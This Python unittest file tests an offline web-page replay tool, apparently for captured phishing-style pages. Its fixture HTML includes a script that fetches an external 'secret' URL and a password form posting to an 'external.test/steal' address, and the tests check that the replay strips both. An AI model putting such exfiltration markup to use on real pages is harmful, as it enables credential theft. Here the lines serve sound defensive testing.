"""Offline replay regression tests without a browser or live website."""
import base64
import json
from pathlib import Path
import tempfile
import unittest
from capture_replay import CaptureReplay


class ReplayTests(unittest.TestCase):
    def make_recording(self, base):
        folder = Path(base)
        (folder / "bundle.json").write_text(json.dumps({
            "startUrl": "https://example.test/a/b",
            "steps": [{"url": "https://example.test/a/b", "html": "step-000.html"},
                      {"url": "https://example.test/a/b", "html": "step-001.html"}]
        }))
        (folder / "step-000.html").write_text(
            "<!doctype html><html><body><img src='/logo.png'>"
            "<script>fetch('https://external.test/secret')</script>"
            "<form action='https://external.test/steal'><input type='password' value='dummy'>"
            "<button type='submit'>Continue</button></form>"
            "<a href='https://external.test'>External</a></body></html>"
        )
        (folder / "step-001.html").write_text("<html><body><p>Stage 2</p></body></html>")
        (folder / "trace.har").write_text(json.dumps({"log": {"entries": [{
            "request": {"method": "GET", "url": "https://example.test/logo.png"},
            "response": {"content": {"mimeType": "image/png",
                                     "text": base64.b64encode(b"IMAGE").decode(),
                                     "encoding": "base64"}}
        }]}}))

    def test_visual_assets_and_scripts_restricted(self):
        with tempfile.TemporaryDirectory() as t:
            self.make_recording(t)
            replay = CaptureReplay(t)
            self.assertEqual(replay.host, "example.test")
            status, raw, _ = replay.respond("GET", "/a/b")
            page = raw.decode()
            self.assertEqual(status, 200)
            self.assertNotIn("external.test", page)
            self.assertNotIn("dummy", page)
            self.assertIn("/__mock_capture/assets/", page)
            self.assertIn("/__mock_capture/sim.js", page)
            self.assertIn("form", page)
            self.assertEqual(replay.respond("GET", "/a/b", "__mock_step=1")[0], 200)
            self.assertIn("Stage 2", replay.respond("GET", "/a/b", "__mock_step=1")[1].decode())
            self.assertEqual(replay.respond("POST", "/a/b")[0], 405)
            self.assertEqual(replay.respond("GET", "/wrong")[0], 404)
            self.assertEqual(replay.respond("GET", "/a/b", "__mock_step=999")[0], 404)


if __name__ == "__main__":
    unittest.main()
